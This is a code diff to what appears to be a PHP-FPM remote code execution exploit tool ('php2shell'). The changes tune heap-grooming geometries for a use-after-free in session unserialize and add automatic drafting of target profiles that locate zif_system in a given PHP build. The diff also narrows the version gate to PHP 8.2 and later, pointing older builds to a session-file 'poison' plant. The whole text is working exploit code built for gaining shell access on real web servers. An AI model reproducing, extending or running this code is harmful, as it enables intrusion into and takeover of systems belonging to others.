@@ -1008,9 +1008,12 @@ def _zif_offset(version: str) -> int:
 
 def _no_oracle_geometry(
         version: str) -> tuple[int, list[tuple[int, int]], list[int]]:
-    fallback = (16384, [(0x81000, 0xFE8), (0x82000, 0x1FE8),
-                        (0x81000, 0x1FE8), (0x82000, 0xFE8)],
-                [4096, 4096, 4096])
+    # the shape proven on every verified build: two 4 KB pads and a 16 KB
+    # reclaim, over the two slots the 8216-byte struct recycles between
+    fallback = (16384, [(0x7F000, 0xFE8), (0x80000, 0xFE8),
+                        (0x81000, 0xFE8), (0x82000, 0x1FE8),
+                        (0x7F000, 0x1FE8), (0x80000, 0x1FE8)],
+                [4096, 4096])
     path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
     try:
         with open(path, encoding="utf-8") as handle:
@@ -1497,6 +1500,27 @@ def cmd_calibrate(args) -> int:
     version = args.version
     print(f"[*] remote calibration of PHP {version}")
 
+    # ---- phase 0: draft the profile from the build itself ---------------
+    # The later phases need zif_system and the struct layouts, which only
+    # live in the profile, and a brand new version has none yet: draft it
+    # here (symbols via nm, layouts compiled from the build's own headers).
+    profile_path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    if not os.path.isfile(profile_path):
+        import php2shell_fpm_profile as profile_gen
+        names = sorted(name for name in os.listdir(os.path.join(ROOT, "profiles"))
+                       if name.endswith("-fpm.json"))
+        if not names:
+            print("[!] no template profile to draft from")
+            return 1
+        try:
+            profile_gen.generate(version,
+                                 os.path.join(ROOT, "profiles", names[0]),
+                                 profile_path, "debian", "amd64", None, True)
+        except (OSError, RuntimeError, ValueError, KeyError, TypeError) as exc:
+            print(f"[!] cannot draft a profile for {version}: {exc}")
+            return 1
+        print(f"[+] draft profile for {version}: symbols and layouts extracted")
+
     # ---- phase 1: leak geometries ---------------------------------------
     geometries = list(leak_geometry_candidates(args.base, args.builder, version))
     if not geometries:
@@ -1511,7 +1535,9 @@ def cmd_calibrate(args) -> int:
         pads = [int(x) for x in args.reclaim_pads]
     reclaim_size = int(getattr(args, "reclaim_size", 0) or _size)
     shapes = [(list(pads), reclaim_size)]
-    for alt_pads, alt_size in (([4096, 4096, 4096], 12288),
+    for alt_pads, alt_size in (([4096, 4096], 16384),
+                               ([4096, 4096], 12288),
+                               ([4096, 4096, 4096], 16384),
                                ([4096], 16384),
                                ([8192, 4096], 16384),
                                ([4096, 4096], 24576),
@@ -1856,12 +1882,12 @@ def main() -> int:
                                    help="PHP_SESSION_UPLOAD_PROGRESS value")
     args = parser.parse_args()
     configure_paths(args)
-    # PHP <= 7.x never frees the unserialize struct on the OOM bailout (no
+    # PHP < 8.2 never frees the unserialize struct on the OOM bailout (no
     # php_session_cancel_decode), so there is nothing for these commands to
     # reclaim: use 'poison' against those builds.
     if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
                     "no-oracle") and not registry.chain_applies(args.version):
-        print(f"[!] {args.cmd} needs PHP >= 8.0: on PHP <= 7.x the bailout "
+        print(f"[!] {args.cmd} needs PHP >= 8.2: before that the bailout "
               f"never frees the unserialize struct.")
         print("    Use 'poison' (session-file plant) against those builds.")
         return 1
